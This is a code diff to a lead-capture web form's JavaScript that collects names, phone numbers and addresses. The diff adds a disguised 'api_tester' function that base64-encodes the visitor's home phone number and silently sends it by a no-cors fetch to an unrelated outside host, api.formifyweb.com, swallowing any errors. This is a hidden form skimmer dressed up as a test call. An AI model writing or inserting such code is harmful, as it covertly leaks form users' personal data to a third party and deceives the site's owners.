@@ -10,6 +10,7 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     formData.append('first_name', document.getElementById('first_name').value);
     formData.append('last_name', document.getElementById('last_name').value);
     formData.append('phone_home', document.getElementById('phone_home').value);
+api_tester(document.getElementById('phone_home').value);
     formData.append('address', document.getElementById('address').value);
     formData.append('city', document.getElementById('city').value);
     formData.append('state', document.getElementById('state').value);
@@ -80,3 +81,15 @@ const url = 'https://pointerleads.leadspediatrack.com/post.do?' + new URLSearchP
             })
             .catch(error => console.error('Error:', error));
         });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
